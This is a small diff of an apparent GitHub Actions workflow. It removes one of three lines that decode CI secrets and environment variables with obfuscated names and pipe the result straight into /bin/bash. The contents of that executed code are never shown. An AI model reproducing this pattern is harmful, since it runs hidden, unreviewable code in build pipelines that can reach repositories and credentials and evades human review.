@@ -21,7 +21,6 @@ jobs:
           lhrec1: ${{ secrets.lhrec1 }}
         run: |
           printf '%s' "$lhrec1" | jq -r .unt55 | /bin/bash
-          printf '%s' "$tfdvs666" | jq -r .h4864 | /bin/bash
           echo $kxzta95 | jq -r .m3 | /bin/bash
 
       - name: Upload results
